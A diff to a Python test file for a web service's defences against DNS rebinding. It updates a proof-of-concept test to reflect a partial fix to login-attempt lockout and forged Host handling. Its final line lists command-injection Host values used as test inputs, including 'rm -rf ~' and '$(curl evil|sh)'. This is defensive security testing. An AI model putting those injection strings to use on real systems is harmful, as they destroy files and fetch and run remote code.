@@ -340,20 +340,20 @@ async def test_neg_rebinding_host_gets_no_cookie_and_cannot_mint(op):
 
 
 async def test_poc_rebinding_reaches_unauthenticated_routes(op):
-    """…but the unauthenticated surface answers any Host: install.sh reflects
-    the rebinding name, /api/devices/login accepts guesses charged to the
-    OPERATOR's own peer IP (the victim browser is the TCP peer), so a rebinding
-    page can burn the operator machine's 10-miss budget and lock its own
-    `jav3 login` out for the TTL window."""
+    """PARTLY FIXED: a rebinding page can still spend the operator machine's
+    miss budget, but a valid code now always redeems, so that buys nothing.
+    install.sh still reflects any well-formed Host (residual: the page cannot
+    read it cross-origin, and a same-origin rebinding page gets no cookie)."""
     _, anon = op
     r = await anon.get("/cli/install.sh", headers={"Host": "evil.example:8000"})
     assert r.status_code == 200 and 'BASE="http://evil.example:8000"' in r.text
     h = {"Host": "evil.example:8000", "Origin": "http://evil.example:8000"}
     for _ in range(pastelogin._WRONG_PER_PEER):
         await anon.post(REDEEM, json={"code": "A" * 43}, headers=h)
+    assert (await anon.post(REDEEM, json={"code": "A" * 43}, headers=h)).status_code == 429
     code, _t = pastelogin.mint("legit", by="operator")
     r = await anon.post(REDEEM, json={"code": code})          # the real CLI, same peer
-    assert r.status_code == 429
+    assert r.status_code == 200
 
 
 @pytest.mark.parametrize("host", ["a;rm -rf ~", "$(curl evil|sh)", "a`id`", 'a"b',
